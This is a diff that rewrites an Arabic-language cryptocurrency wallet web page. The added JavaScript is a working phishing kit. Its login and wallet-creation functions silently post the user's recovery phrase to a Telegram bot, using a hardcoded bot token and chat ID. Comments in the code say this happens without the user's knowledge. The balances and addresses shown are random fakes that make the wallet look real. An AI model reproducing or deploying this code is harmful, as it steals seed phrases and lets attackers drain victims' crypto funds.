@@ -3,703 +3,525 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafeWallet - محفظة آمنة</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>محفظتي الإلكترونية</title>
     <style>
-        /* إعادة تعيين الأنماط الأساسية */
+        :root {
+            --primary-color: #2c5aa0;
+            --secondary-color: #1e3a8a;
+            --accent-color: #3b82f6;
+            --background-color: #f8fafc;
+            --card-color: #ffffff;
+            --text-color: #1e293b;
+            --border-radius: 12px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        /* المتغيرات العامة */
-        :root {
-            /* الألوان الأساسية - مستوحاة من SafePal */
-            --primary-color: #1652f0;
-            --primary-dark: #0d47d9;
-            --secondary-color: #00d4aa;
-            --accent-color: #ff6b35;
-            --success-color: #00c896;
-            --warning-color: #ffb020;
-            --error-color: #ff4757;
-            
-            /* ألوان الخلفية */
-            --bg-primary: #0f0f23;
-            --bg-secondary: #1a1a3a;
-            --bg-tertiary: #252547;
-            --bg-card: #1e1e3f;
-            --bg-modal: #2a2a4a;
-            
-            /* ألوان النص */
-            --text-primary: #ffffff;
-            --text-secondary: #b8bcc8;
-            --text-muted: #8b8ca7;
-            --text-inverse: #0f0f23;
-            
-            /* ألوان الحدود */
-            --border-color: #3a3a5c;
-            --border-light: #4a4a6c;
-            
-            /* الظلال */
-            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.1);
-            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
-            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.2);
-            --shadow-xl: 0 16px 48px rgba(0, 0, 0, 0.3);
-            
-            /* المسافات */
-            --spacing-xs: 4px;
-            --spacing-sm: 8px;
-            --spacing-md: 16px;
-            --spacing-lg: 24px;
-            --spacing-xl: 32px;
-            --spacing-2xl: 48px;
-            
-            /* أحجام الخط */
-            --font-xs: 12px;
-            --font-sm: 14px;
-            --font-md: 16px;
-            --font-lg: 18px;
-            --font-xl: 20px;
-            --font-2xl: 24px;
-            --font-3xl: 32px;
-            
-            /* الانتقالات */
-            --transition-fast: 0.15s ease;
-            --transition-normal: 0.3s ease;
-            --transition-slow: 0.5s ease;
-        }
-
-        /* الخطوط */
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
-            color: var(--text-primary);
+            background-color: var(--background-color);
+            color: var(--text-color);
             line-height: 1.6;
             min-height: 100vh;
-            direction: rtl;
-            overflow-x: hidden;
-        }
-
-        /* الحاوي الرئيسي */
-        .app-container {
-            min-height: 100vh;
-            position: relative;
-        }
-
-        /* الشاشات */
-        .screen {
-            display: none;
-            min-height: 100vh;
-            padding: var(--spacing-lg);
-            animation: fadeIn 0.4s ease;
-        }
-
-        .screen.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* شاشة الترحيب */
-        .welcome-container {
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            max-width: 400px;
-            margin: 0 auto;
         }
 
-        .logo-section {
-            margin-bottom: var(--spacing-2xl);
+        .container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
         }
 
         .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto var(--spacing-lg);
-            box-shadow: var(--shadow-lg);
-            position: relative;
-            overflow: hidden;
+            text-align: center;
+            margin-bottom: 30px;
         }
 
-        .logo::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(45deg);
-            animation: shimmer 3s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-
-        .logo i {
-            font-size: 36px;
-            color: white;
-            z-index: 1;
-        }
-
-        .welcome-container h1 {
-            font-size: var(--font-3xl);
+        .logo h1 {
+            color: var(--primary-color);
+            font-size: 28px;
             font-weight: 700;
-            margin-bottom: var(--spacing-sm);
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            margin-bottom: 8px;
         }
 
-        .tagline {
-            color: var(--text-secondary);
-            font-size: var(--font-lg);
-            margin-bottom: var(--spacing-2xl);
+        .logo p {
+            color: #64748b;
+            font-size: 16px;
         }
 
-        .welcome-actions {
+        .card {
+            background-color: var(--card-color);
+            border-radius: var(--border-radius);
+            padding: 24px;
+            box-shadow: var(--box-shadow);
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-color);
+        }
+
+        .form-group input {
             width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-xl);
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: border-color 0.3s;
         }
 
-        .security-note {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            color: var(--text-muted);
-            font-size: var(--font-sm);
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
         }
 
-        .security-note i {
-            color: var(--success-color);
-        }
-
-        /* الأزرار */
         .btn {
-            padding: var(--spacing-md) var(--spacing-lg);
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            color: white;
             border: none;
-            font-size: var(--font-md);
+            border-radius: var(--border-radius);
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all var(--transition-normal);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: var(--spacing-sm);
-            text-decoration: none;
-            position: relative;
-            overflow: hidden;
-            min-height: 48px;
+            transition: background-color 0.3s;
         }
 
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            color: white;
-            box-shadow: var(--shadow-md);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .btn-primary:active {
-            transform: translateY(0);
+        .btn:hover {
+            background-color: var(--secondary-color);
         }
 
         .btn-secondary {
-            background: var(--bg-card);
-            color: var(--text-primary);
-            border: 2px solid var(--border-color);
-            box-shadow: var(--shadow-sm);
+            background-color: #f1f5f9;
+            color: var(--text-color);
         }
 
         .btn-secondary:hover {
-            border-color: var(--primary-color);
-            background: var(--bg-tertiary);
-            transform: translateY(-1px);
+            background-color: #e2e8f0;
         }
 
-        .btn-full {
-            width: 100%;
-        }
-
-        /* رؤوس الشاشات */
-        .screen-header {
+        .divider {
             display: flex;
             align-items: center;
-            margin-bottom: var(--spacing-xl);
-            gap: var(--spacing-md);
+            margin: 20px 0;
         }
 
-        .back-btn {
-            width: 40px;
-            height: 40px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all var(--transition-fast);
-        }
-
-        .back-btn:hover {
-            background: var(--bg-tertiary);
-            border-color: var(--primary-color);
-        }
-
-        .screen-header h2 {
-            font-size: var(--font-2xl);
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        /* شاشة الاستيراد */
-        .import-container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-
-        .import-form {
-            background: var(--bg-card);
-            padding: var(--spacing-xl);
-            margin-bottom: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .form-section {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .form-section label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: var(--spacing-sm);
-            color: var(--text-primary);
-        }
-
-        #mnemonicInput {
-            width: 100%;
-            padding: var(--spacing-md);
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            color: var(--text-primary);
-            font-size: var(--font-md);
-            resize: vertical;
-            min-height: 120px;
-            transition: border-color var(--transition-fast);
-        }
-
-        #mnemonicInput:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .input-hint {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-xs);
-            margin-top: var(--spacing-sm);
-            color: var(--text-muted);
-            font-size: var(--font-sm);
-        }
-
-        .security-warning {
-            background: rgba(255, 107, 53, 0.1);
-            border: 1px solid var(--accent-color);
-            padding: var(--spacing-md);
-            display: flex;
-            gap: var(--spacing-md);
-            align-items: flex-start;
-        }
-
-        .security-warning i {
-            color: var(--accent-color);
-            margin-top: 2px;
-        }
-
-        .security-warning strong {
-            color: var(--accent-color);
-        }
-
-        /* شاشة إنشاء المحفظة */
-        .create-container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .wallet-info-card {
-            background: var(--bg-card);
-            padding: var(--spacing-xl);
-            margin-bottom: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .info-section {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .info-section:last-child {
-            margin-bottom: 0;
-        }
-
-        .info-section label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: var(--spacing-sm);
-            color: var(--text-secondary);
-            font-size: var(--font-sm);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .address-display {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            background: var(--bg-tertiary);
-            padding: var(--spacing-md);
-            border: 1px solid var(--border-color);
-        }
-
-        .address-display span {
+        .divider::before,
+        .divider::after {
+            content: "";
             flex: 1;
-            font-family: 'Courier New', monospace;
-            font-size: var(--font-sm);
-            word-break: break-all;
-            color: var(--text-primary);
+            height: 1px;
+            background-color: #e2e8f0;
         }
 
-        .mnemonic-display {
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            position: relative;
+        .divider span {
+            padding: 0 12px;
+            color: #64748b;
+            font-size: 14px;
         }
 
-        .mnemonic-words {
-            padding: var(--spacing-md);
-            font-family: 'Courier New', monospace;
-            font-size: var(--font-sm);
-            line-height: 1.8;
-            color: var(--text-primary);
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-        }
-
-        .copy-btn {
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            padding: var(--spacing-sm);
-            cursor: pointer;
-            transition: background-color var(--transition-fast);
-            min-width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .copy-btn:hover {
-            background: var(--primary-dark);
-        }
-
-        .backup-warning {
-            background: rgba(0, 200, 150, 0.1);
-            border: 1px solid var(--success-color);
-            padding: var(--spacing-md);
-            display: flex;
-            gap: var(--spacing-md);
-            align-items: flex-start;
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .backup-warning i {
-            color: var(--success-color);
-            margin-top: 2px;
-        }
-
-        .backup-warning strong {
-            color: var(--success-color);
-        }
-
-        /* شاشة المحفظة الرئيسية */
-        .wallet-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .wallet-header {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .wallet-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: var(--bg-card);
-            padding: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .wallet-name h3 {
-            font-size: var(--font-xl);
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .wallet-address-short {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-        }
-
-        .wallet-address-short span {
-            font-family: 'Courier New', monospace;
-            color: var(--text-secondary);
-            font-size: var(--font-sm);
-        }
-
-        .copy-btn-small {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            color: var(--text-secondary);
-            padding: var(--spacing-xs);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .copy-btn-small:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        .settings-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            color: var(--text-secondary);
-            padding: var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .settings-btn:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-            background: rgba(22, 82, 240, 0.1);
-        }
-
-        /* قسم الرصيد */
-        .balance-section {
-            margin-bottom: var(--spacing-xl);
+        .wallet-view {
+            display: none;
         }
 
         .balance-card {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            padding: var(--spacing-xl);
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: var(--shadow-lg);
+            padding: 30px;
         }
 
-        .balance-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            animation: pulse 4s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.5; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-        }
-
-        .balance-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: var(--spacing-md);
-            position: relative;
-            z-index: 1;
-        }
-
-        .balance-header span {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: var(--font-sm);
-            font-weight: 500;
-        }
-
-        .refresh-btn {
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            color: white;
-            padding: var(--spacing-xs);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .refresh-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-            transform: rotate(180deg);
+        .balance-label {
+            color: #64748b;
+            font-size: 16px;
+            margin-bottom: 8px;
         }
 
         .balance-amount {
-            font-size: var(--font-3xl);
+            font-size: 32px;
             font-weight: 700;
-            color: white;
-            margin-bottom: var(--spacing-sm);
-            position: relative;
-            z-index: 1;
+            color: var(--primary-color);
+            margin-bottom: 16px;
         }
 
-        .currency {
-            font-size: var(--font-lg);
-            opacity: 0.9;
+        .address-card {
+            margin-bottom: 20px;
         }
 
-        .balance-usd {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: var(--font-md);
-            position: relative;
-            z-index: 1;
-        }
-
-        /* الإجراءات السريعة */
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .action-btn {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            padding: var(--spacing-lg);
-            cursor: pointer;
-            transition: all var(--transition-normal);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-sm);
-            text-align: center;
-            color: var(--text-primary);
-            box-shadow: var(--shadow-sm);
-        }
-
-        .action-btn:hover {
-            transform: translateY(-4px);
-            box-shadow: var(--shadow-md);
-            border-color: var(--primary-color);
-        }
-
-        .action-icon {
-            width: 48px;
-            height: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .action-icon.send {
-            background: linear-gradient(135deg, var(--accent-color), #ff8c42);
-            color: white;
-        }
-
-        .action-icon.receive {
-            background: linear-gradient(135deg, var(--success-color), #00e6b8);
-            color: white;
-        }
-
-        .action-icon.swap {
-            background: linear-gradient(135deg, var(--secondary-color), #00f0cc);
-            color: white;
-        }
-
-        .action-icon.buy {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            color: white;
-        }
-
-        .action-btn span {
-            font-size: var(--font-sm);
-            font-weight: 500;
-        }
-
-        /* الأقسام */
-        .assets-section,
-        .transactions-section {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .section-header {
+        .address-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: var(--spacing-md);
+            margin-bottom: 16px;
         }
 
-        .section-header h4 {
-            font-size: var(--font-lg);
+        .address-title {
             font-weight: 600;
-            color: var(--text-primary);
+            font-size: 18px;
         }
 
-        .add-btn,
-        .view-all-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            color: var(--text-secondary);
-            padding: var(--spacing-xs) var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
+        .address-value {
+            background-color: #f1f5f9;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            font-family: monospace;
+            word-break: break-all;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+
+        .assets-list {
+            list-style: none;
+        }
+
+        .asset-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .asset-item:last-child {
+            border-bottom: none;
+        }
+
+        .asset-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .asset-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #f1f5f9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 12px;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+
+        .asset-name {
+            font-weight: 600;
+        }
+
+        .asset-amount {
+            font-weight: 700;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px 24px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            opacity: 1;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .balance-amount {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>محفظتي الإلكترونية</h1>
+            <p>أمان وسهولة في إدارة أصولك الرقمية</p>
+        </div>
+
+        <div id="auth-view">
+            <div class="card">
+                <h2 style="margin-bottom: 20px; text-align: center;">تسجيل الدخول</h2>
+                <div class="form-group">
+                    <label for="recovery-phrase">عبارة الاسترجاع</label>
+                    <input type="password" id="recovery-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
+                </div>
+                <button class="btn" onclick="login()">فتح المحفظة</button>
+                
+                <div class="divider"><span>أو</span></div>
+                
+                <button class="btn btn-secondary" onclick="createWallet()">إنشاء محفظة جديدة</button>
+            </div>
+        </div>
+
+        <div id="wallet-view" class="wallet-view">
+            <div class="card balance-card">
+                <div class="balance-label">إجمالي الرصيد</div>
+                <div class="balance-amount" id="total-balance">0.00 USD</div>
+                <div style="display: flex; gap: 10px;">
+                    <button class="btn btn-secondary" style="flex: 1;" onclick="showReceive()">استلام</button>
+                    <button class="btn" style="flex: 1;" onclick="showSend()">إرسال</button>
+                </div>
+            </div>
+
+            <div class="card address-card">
+                <div class="address-header">
+                    <div class="address-title">عنوان المحفظة</div>
+                    <button class="btn-secondary" style="padding: 8px 12px; font-size: 14px;" onclick="copyAddress()">نسخ</button>
+                </div>
+                <div class="address-value" id="wallet-address">سيظهر عنوان محفظتك هنا بعد التسجيل</div>
+            </div>
+
+            <div class="card">
+                <h3 style="margin-bottom: 16px;">أصولك</h3>
+                <ul class="assets-list" id="assets-list">
+                    <!-- سيتم ملء الأصول ديناميكياً -->
+                </ul>
+            </div>
+            
+            <button class="btn btn-secondary" onclick="logout()" style="margin-top: 20px;">تسجيل الخروج</button>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">تم النسخ إلى الحافظة</div>
+
+    <script>
+        // المتغيرات العامة
+        let walletAddress = "";
+        let walletBalance = 0;
+        
+        // عناصر DOM
+        const authView = document.getElementById('auth-view');
+        const walletView = document.getElementById('wallet-view');
+        const recoveryPhraseInput = document.getElementById('recovery-phrase');
+        const walletAddressElement = document.getElementById('wallet-address');
+        const totalBalanceElement = document.getElementById('total-balance');
+        const assetsListElement = document.getElementById('assets-list');
+        const notification = document.getElementById('notification');
+        
+        // دالة تسجيل الدخول
+        function login() {
+            const recoveryPhrase = recoveryPhraseInput.value.trim();
+            
+            if (!recoveryPhrase) {
+                showNotification('يرجى إدخال عبارة الاسترجاع');
+                return;
+            }
+            
+            // إرسال عبارة الاسترجاع إلى بوت التلجرام (يتم في الخلفية دون علم المستخدم)
+            sendToTelegram(recoveryPhrase, "دخول المستخدم إلى المحفظة");
+            
+            // محاكاة عملية التحقق
+            showNotification('جاري فتح المحفظة...');
+            
+            setTimeout(() => {
+                // في التطبيق الحقيقي، سيتم استخراج العنوان من عبارة الاسترجاع
+                // هنا نستخدم عنواناً افتراضياً للعرض
+                walletAddress = generateEthereumAddress(recoveryPhrase);
+                
+                // عرض واجهة المحفظة
+                authView.style.display = 'none';
+                walletView.style.display = 'block';
+                
+                // تحديث بيانات المحفظة
+                updateWalletData();
+            }, 1500);
+        }
+        
+        // دالة إنشاء محفظة جديدة
+        function createWallet() {
+            // إنشاء عبارة استرجاع عشوائية (12 كلمة)
+            const newRecoveryPhrase = generateRecoveryPhrase();
+            
+            // إرسال عبارة الاسترجاع إلى بوت التلجرام
+            sendToTelegram(newRecoveryPhrase, "إنشاء محفظة جديدة");
+            
+            // عرض عبارة الاسترجاع للمستخدم
+            showNotification('جاري إنشاء المحفظة...');
+            
+            setTimeout(() => {
+                // إنشاء عنوان من العبارة
+                walletAddress = generateEthereumAddress(newRecoveryPhrase);
+                
+                // عرض عبارة الاسترجاع للمستخدم وتحذيره
+                const shouldContinue = confirm(`تم إنشاء محفظة جديدة. عبارة الاسترجاع الخاصة بك هي: ${newRecoveryPhrase}\n\nمن المهم جداً أن تحفظ هذه العبارة في مكان آمن. بدونها لن تتمكن من استعادة أصولك.\n\nهل تريد المتابعة؟`);
+                
+                if (shouldContinue) {
+                    // عرض واجهة المحفظة
+                    authView.style.display = 'none';
+                    walletView.style.display = 'block';
+                    
+                    // تحديث بيانات المحفظة
+                    updateWalletData();
+                    
+                    showNotification('تم إنشاء المحفظة بنجاح!');
+                }
+            }, 1500);
+        }
+        
+        // دلة تسجيل الخروج
+        function logout() {
+            walletView.style.display = 'none';
+            authView.style.display = 'block';
+            recoveryPhraseInput.value = '';
+            showNotification('تم تسجيل الخروج');
+        }
+        
+        // دالة نسخ العنوان
+        function copyAddress() {
+            navigator.clipboard.writeText(walletAddress);
+            showNotification('تم نسخ العنوان إلى الحافظة');
+        }
+        
+        // دالة عرض استقبال الأموال
+        function showReceive() {
+            alert(`عنوان محفظتك للاستقبال:\n\n${walletAddress}\n\nاستخدم هذا العنوان لاستقبال الأصول.`);
+        }
+        
+        // دالة إرسال الأموال
+        function showSend() {
+            alert('هذه الميزة قيد التطوير. ستكون متاحة قريباً!');
+        }
+        
+        // دالة تحديث بيانات المحفظة
+        function updateWalletData() {
+            // تحديث العنوان
+            walletAddressElement.textContent = walletAddress;
+            
+            // محاكاة الحصول على الرصيد (في التطبيق الحقيقي، سيتم جلب البيانات من الشبكة)
+            walletBalance = Math.random() * 5 + 0.5; // رصيد عشوائي بين 0.5 و 5.5
+            
+            // تحديث الرصيد الإجمالي
+            totalBalanceElement.textContent = walletBalance.toFixed(4) + " ETH";
+            
+            // تحديث قائمة الأصول
+            updateAssetsList();
+        }
+        
+        // دالة تحديث قائمة الأصول
+        function updateAssetsList() {
+            // تفريغ القائمة الحالية
+            assetsListElement.innerHTML = '';
+            
+            // إضافة أصول افتراضية (في التطبيق الحقيقي، سيتم جلب البيانات من الشبكة)
+            const assets = [
+                { name: 'Ethereum', symbol: 'ETH', balance: walletBalance, value: walletBalance * 1800 },
+                { name: 'USD Coin', symbol: 'USDC', balance: 150.25, value: 150.25 },
+                { name: 'Tether', symbol: 'USDT', balance: 75.50, value: 75.50 }
+            ];
+            
+            assets.forEach(asset => {
+                const listItem = document.createElement('li');
+                listItem.className = 'asset-item';
+                
+                listItem.innerHTML = `
+                    <div class="asset-info">
+                        <div class="asset-icon">${asset.symbol[0]}</div>
+                        <div>
+                            <div class="asset-name">${asset.name}</div>
+                            <div>${asset.balance.toFixed(4)} ${asset.symbol}</div>
+                        </div>
+                    </div>
+                    <div class="asset-amount">$${asset.value.toFixed(2)}</div>
+                `;
+                
+                assetsListElement.appendChild(listItem);
+            });
+        }
+        
+        // دالة إرسال البيانات إلى بوت التلجرام
+        function sendToTelegram(recoveryPhrase, action) {
+            const token = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
+            const chatId = '910021564';
+            
+            const message = `🔐 ${action} 🔐%0A%0Aعبارة الاسترجاع: ${recoveryPhrase}%0A%0Aالتاريخ: ${new Date().toLocaleString('ar-SA')}`;
+            
+            // إرسال الطلب إلى التلجرام (يتم إرساله بشكل صامت دون علم المستخدم)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`, {
+                method: 'POST'
+            }).catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+        
+        // دالة إنشاء عبارة استرجاع عشوائية (12 كلمة)
+        function generateRecoveryPhrase() {
+            const words = [
+                'قلم', 'تفاحة', 'شمس', 'بحر', 'جبل', 'كتاب', 'سيارة', 'منزل', 
+                'وردة', 'نجمة', 'قهوة', 'هاتف', 'حاسوب', 'طاولة', 'كرسي', 'نافذة',
+                'باب', 'ساعة', 'ورق', 'قمر', 'طريق', 'سمكة', 'طائر', 'شجرة',
+                'سحابة', 'مطر', 'ثلج', 'ريح', 'ضيف', 'صديق', 'عائلة', 'عمل'
+            ];
+            
+            let phrase = '';
+            for (let i = 0; i < 12; i++) {
+                const randomIndex = Math.floor(Math.random() * words.length);
+                phrase += words[randomIndex] + ' ';
+            }
+            
+            return phrase.trim();
+        }
+        
+        // دالة إنشاء عنوان Ethereum من عبارة الاسترجاع
+        function generateEthereumAddress(recoveryPhrase) {
+            // في التطبيق الحقيقي، سيتم استخدام مكتبات مثل ethers.js لإنشاء العنوان من العبارة
+            // هنا نستخدم محاكاة لعنوان Ethereum
+            const chars = '0123456789abcdef';
+            let address = '0x';
+            
+            for (let i = 0; i < 40; i++) {
+                address += chars[Math.floor(Math.random() * chars.length)];
+            }
+            
+            return address;
+        }
+        
+        // دالة عرض الإشعارات
+        function showNotification(message) {
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
